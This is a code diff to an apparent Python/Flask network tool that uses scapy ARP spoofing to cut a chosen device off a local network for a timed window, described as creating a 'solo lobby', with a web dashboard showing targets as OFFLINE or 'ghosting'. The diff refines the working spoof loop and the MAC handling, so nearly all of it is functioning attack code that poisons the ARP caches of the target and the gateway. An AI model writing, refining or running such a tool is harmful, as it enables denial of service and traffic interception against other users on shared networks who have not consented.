@@ -161,19 +161,22 @@ def timed_intercept_logic(target_ip, gateway_ip, duration_ms):
     try:
         target_mac = get_mac(target_ip)
         gateway_mac = get_mac(gateway_ip)
-        if not target_mac: return
+        if not target_mac or not gateway_mac:
+            print(f"[!] GHOST FAIL: Could not resolve MAC for {target_ip} or {gateway_ip}")
+            return
         
         stop_event = threading.Event()
-        threading.Thread(target=spoof_loop, args=(target_ip, gateway_ip, stop_event), daemon=True).start()
+        # Pass MACs directly to avoid re-resolving in the thread
+        threading.Thread(target=spoof_loop_with_macs, args=(target_ip, target_mac, gateway_ip, gateway_mac, stop_event), daemon=True).start()
         
         while time.time() < state["solo_lobby_expires"]:
             time.sleep(0.05)
             
         stop_event.set()
         
-        if target_mac and gateway_mac:
-            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), iface=state["iface"], count=3, verbose=0)
-            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), iface=state["iface"], count=3, verbose=0)
+        print(f"[+] GHOST SUCCESS: Restoring ARP for {target_ip}")
+        sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), iface=state["iface"], count=3, verbose=0)
+        sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), iface=state["iface"], count=3, verbose=0)
             
     except Exception as e:
         print(f"[!] Timed cut error: {e}")
@@ -181,6 +184,16 @@ def timed_intercept_logic(target_ip, gateway_ip, duration_ms):
         state["solo_lobby_active"] = False
         state["solo_lobby_expires"] = 0
         state["solo_lobby_target"] = None
+
+def spoof_loop_with_macs(target_ip, target_mac, gateway_ip, gateway_mac, stop_event):
+    """Refined spoof loop that uses provided MACs directly."""
+    try:
+        while not stop_event.is_set():
+            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), iface=state["iface"], verbose=0)
+            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), iface=state["iface"], verbose=0)
+            time.sleep(2)
+    except Exception as e:
+        print(f"[!] Spoof loop error: {e}")
 
 # --- Web API Endpoints ---
 @app.route('/api/status', methods=['GET'])
@@ -603,13 +616,14 @@ HTML_TEMPLATE = """
 
             let html = '';
             devices.forEach((dev, index) => {
-                const is_cut = dev.is_cut || globalData.solo_lobby_active;
+                const is_ghosting = globalData.solo_lobby_active && globalData.solo_lobby_target === dev.ip;
+                const is_cut = dev.is_cut || is_ghosting;
 
                 let statusBadge = '';
-                if (globalData.solo_lobby_active && globalData.solo_lobby_target === dev.ip) {
+                if (is_ghosting) {
                     const expireAt = Date.now() + (globalData.solo_lobby_timer * 1000);
                     statusBadge = `<span class="badge badge-cyan">◈ SOLO LOBBY: <span class="ghost-timer mono" data-expire="${expireAt}">${globalData.solo_lobby_timer.toFixed(3)}</span>s</span>`;
-                } else if (is_cut) {
+                } else if (dev.is_cut) {
                     statusBadge = '<span class="badge badge-red">✕ OFFLINE</span>';
                 } else {
                     statusBadge = '<span class="badge badge-green">◉ ONLINE</span>';
